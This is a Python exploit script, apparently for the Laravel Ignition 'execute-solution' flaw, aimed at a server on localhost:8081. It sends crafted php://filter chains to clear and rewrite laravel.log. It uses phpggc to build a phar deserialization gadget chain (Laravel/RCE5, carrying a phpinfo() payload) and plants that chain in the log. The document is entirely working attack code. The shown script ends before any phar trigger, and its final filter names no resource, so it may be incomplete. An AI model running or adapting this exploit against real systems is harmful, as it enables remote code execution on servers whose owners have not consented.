import requests

# First: Send request to clean original log file
url = "http://localhost:8081/_ignition/execute-solution"
headers = {
    "Accept-Encoding": "gzip, deflate",
    "Accept": "*/*",
    "Accept-Language": "en",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",
    "Connection": "close",
    "Content-Type": "application/json"
}
data1 = {
    "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
    "parameters": {
        "variableName": "username",
        "viewFile": "php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log"
    }
}
response1 = requests.post(url, json=data1, headers=headers)
print(response1.status_code, response1.text)

# Second: Generate serialization using phpggc and POC
import subprocess

phpggc_command = """
php -d "phar.readonly=0" ./phpggc Laravel/RCE5 "phpinfo();" --phar phar -o php://output | base64 -w 0 | python3 -c "import sys;print(''.join(['=' + hex(ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"
"""
poc_serialization = subprocess.getoutput(phpggc_command)
print(poc_serialization)

# Third: Send request to add prefix to log
data2 = {
    "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
    "parameters": {
        "variableName": "username",
        "viewFile": "AA"
    }
}
response2 = requests.post(url, json=data2, headers=headers)
print(response2.status_code, response2.text)

# Fourth: Send request with POC in viewFile
data3 = {
    "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
    "parameters": {
        "variableName": "username",
        "viewFile": poc_serialization
    }
}
response3 = requests.post(url, json=data3, headers=headers)
print(response3.status_code, response3.text)

# Fifth: Send request to clean log file
data4 = {
    "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
    "parameters": {
        "variableName": "username",
        "viewFile": "php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8"
    }
}
response4 = requests.post(url, json=data4, headers=headers)
print(response4.status_code, response4.text)
